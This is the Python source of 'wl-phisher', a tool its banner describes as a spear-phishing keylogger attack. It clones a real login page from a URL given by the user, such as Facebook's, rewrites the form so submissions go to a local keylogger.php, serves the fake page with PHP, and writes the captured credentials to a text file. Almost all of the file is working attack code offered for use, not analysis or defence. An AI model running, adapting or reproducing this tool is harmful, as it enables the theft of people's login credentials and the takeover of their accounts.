import os
import sys
import time
import random
import string
import argparse
import subprocess as subp
import requests
import urllib.request, urllib.error, urllib.parse
from bs4 import BeautifulSoup

version = "1.3 (Beta)"
url = ""
form_action = ""

def echo(x):
    tc = {"d":"0","m":"31","h":"32","c":"36","B":"34","y":"33","p":"35"}
    for i in tc:
        x = x.replace("\%s" %i, "\033[1;%s;48m" %tc[i])
    x = x.replace("\cl", "\033[1;0;0m")
    print(x)

def update():
    echo("\c[*] Checking Version This Tool ...\d")
    time.sleep(1)
    echo("\h[+] %s\d" %version)
    echo("\c[*] Checking Update ...\d")
    checking = requests.get("https://raw.githubusercontent.com/zexceed12300/wl-phisher/master/.update")
    r = BeautifulSoup(checking.text, "html.parser")
    s = str(r)
    if "1.3 (Beta)" in s:
        echo("\h[+] No Update, This tool is latest version\d")
        echo("\m[!] Exit!\d")
        sys.exit()
    else:
        update = input("\033[1;33;48m[?] Version %s Is Available, Update Now?[y/n] \033[1;0;0m" %s)
        if "y" in update:
            echo("\h[+] Downloading Package ...")
            with open('Update.log', 'w') as updatelog:
                subp.Popen(['wget', 'https://codeload.github.com/zexceed12300/wl-phisher/zip/master'], stderr=updatelog, stdout=updatelog)
                time.sleep(1)
                echo("\h[+] Unpacking Package ...")
                time.sleep(1)
                subp.Popen(['unzip', 'master'], stderr=updatelog, stdout=updatelog)
                time.sleep(1)
                subp.Popen(['rm', 'master'], stderr=updatelog, stdout=updatelog)
                echo("\h[+] Installing Package\d")
                time.sleep(1)
                os.system("cp -rf wl-phisher-master/* ./")
                os.system("rm -rf wl-phisher-master")
                echo("\c[*] Update Finished!\d")
                echo("\m[!] Exit!\d")
            sys.exit()
        else:
            echo("\m[!] Exit!")
            sys.exit()

def cloning():
    global url
    index_file = open("./HTTPServer/index.html", "w")
    echo("\c[*] Cloning Login Page ...\d")
    try:
        response = urllib.request.urlopen(url)
    except requests.exceptions.MissingSchema:
        echo('\m[!] URL "%s" Does not exist, try -h/--help for helper\d' %url)
        sys.exit()
    except requests.exceptions.ConnectionError:
        echo('\m[!] URL "%s" Does not exist, try -h/--help for helper\d' % url)
        sys.exit()
    element = response.read()
    webContent = element.decode("utf-8")
    index_file.write(webContent)
    index_file.close()
    echo("\h[+] Cloned! Saved in ./HTTPServer/index.html\d")
    time.sleep(1)
    echo('\c[*] Finding <form action=""> element\d')
    time.sleep(1)
    pageContent = open("./HTTPServer/index.html", "r").read()
    def injector_modules():
        if 'action="' in pageContent:
            begin_len = pageContent.find('<form')
            ending_len = pageContent.find('">', begin_len)
            form_script = pageContent[begin_len:ending_len]
            begin_action = form_script.find('action="')
            ending_action = form_script.find('" ', begin_action)
            global form_action
            form_action = form_script[begin_action:ending_action]+'"'
            s = open("./HTTPServer/index.html").read()
        echo("\h[+] Element found :\d {}".format(form_action))
        time.sleep(1)
        echo("\c[*] Injecting keylogger ...")
        if form_action=="":
            echo("\m[!] This Page Login Cannot be Injected With Keylogger!\d")
            echo("\m[!] Exit!\d")
            sys.exit()
        replace = s.replace(form_action, 'action="keylogger.php"')
        f = open("./HTTPServer/index.html", "w")
        f.write(replace)
        f.close()
        echo("\h[+] Keylogger injected! :\d {}".format(form_action.replace(form_action, 'action="keylogger.php"')))
        server()
    injector_modules()

def randomString(stringLength = 10):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

pw_name = randomString(6)

def server():
    f_pw = open("%s.txt" %pw_name, "w")
    f_pw.close()
    s = open("./HTTPServer/keylogger.php").read()
    os.system("rm ./HTTPServer/keylogger.php")
    pw_replace = s.replace("password", pw_name)
    f_password = open("./HTTPServer/keylogger.php", "w")
    f_password.write(pw_replace)
    f_password.close()
    url_replace = pw_replace.replace("URL", url)
    f_url = open("./HTTPServer/keylogger.php", "w")
    f_url.write(url_replace)
    f_url.close()
    c = input("\033[1;33;48m[?] Start Fake login Localhost Server Now?[y/n]\033[1;0;0m")
    if "y" in c:
        echo("\h[+] Server Running On Port ==> 127.0.0.1:8080\d")
        os.system("cd ./HTTPServer && php -S 127.0.0.1:80")
        flogin_return()

    else:
        flogin_return()

def flogin_return():
    s = open("./HTTPServer/keylogger.php").read()
    f_undo = open("./HTTPServer/keylogger.php", "w")
    pw_replace = s.replace(pw_name, "password")
    f_undo.write(pw_replace)
    f_undo.close()

    global url
    url_replace = pw_replace.replace(url, "URL")
    f_url = open("./HTTPServer/keylogger.php", "w")
    f_url.write(url_replace)
    f_url.close()
    echo("\n\h[+] Keylogger Information Saved On ./%s.txt" %pw_name)
    echo("\m[!] Exit!")


def usage():
    echo("""
           \h_\d    \y_ ____\d  \m_\d      \y_ ____\d   \m_\d
 \h _     _ | |\d     \m____ | |     _  ____ | |     ____  ___\d
 \h| | _ | || |\d \y__\d \m|  _ || |___ |_||  __|| |___ |  _ ||  _|\d
 \h| || || || |\d\y|__|\d\m|  __||  _  || ||__  ||  _  ||  __|| |\d
 \h\_______/|_|\d    \m| |   |_| |_||_||____||_| |_||____||_|\d
     \y_ ____\d      \m|_|\d \cWeb-Login Phisher v1.1 Beta\d \y_ _____\d

          \h[ \ySpear Phising Keylogger Attack With\d \h] 
               [ \yCustom Cloned Login Page\d \h]\d
\h---------------------------------------------------------\d
\h[+] Developer\d  \y:\d \hXenz\d\y@\mZexceed12300\d
\h[+] Contact me\d \y:\d \chttps://www.facebook.com/profile.php?id=100011531026694\d
\h[+] Github\d     \y:\d \chttps://github.com/zexceed12300\d
\h[+] Version\d    \y:\d \h1.2 (Beta)\d
\h_________________________________________________________\d               
               """)
usage()

def get_parameters():
    global url
    parser = argparse.ArgumentParser()
    parser.add_argument("-upt", "--update", help='check update release', action="store_true")
    parser.add_argument("-u", "--url", help='Clone URL page login (e.g. "--url https://facebook.com/login.php")')
    parser.add_argument("-c", "--custom", help='Your own custom index.html(login Page) (e.g. "--custom ./HTTPServer/YAHOOCustom/). Read README.md for create your own custom Login Page"')
    args = parser.parse_args()
    url = str(args.url)

    if args.custom:
        if args.url:
            echo("\m[!] Cant try -c/--custom with -u/--url. You can try one!")
            echo("\m[!] Exit!")
            sys.exit()
        if args.update:
            echo("\m[!] Cant try -c/--custom with -upt/--update. You can try one!")
            echo("\m[!] Exit!")
        echo("\h[+] This Features Not Available Now(coming soon)\d")
        echo("\m[!] Exit!\d")

    elif args.update:
        if args.url:
            echo("\m[!] Cant try -upt/--update with -u/--url. You can try one!")
            echo("\m[!] Exit!")
            sys.exit()
        if args.custom:
            echo("\m[!] Cant try -upt/--update with -c/--custom. You can try one!")
            echo("\m[!] Exit!")
            sys.exit()
        update()

    elif args.url:
        if args.update:
            echo("\m[!] Cant try -u/--url with -upt/--update. You can try one!")
            echo("\m[!] Exit!")
        if args.custom:
            echo("\m[!] Cant try -u/--url with -c/--custom. You can try one!")
            echo("\m[!] Exit!")
            sys.exit()
        cloning()
    else:
        parser.print_help()

get_parameters()
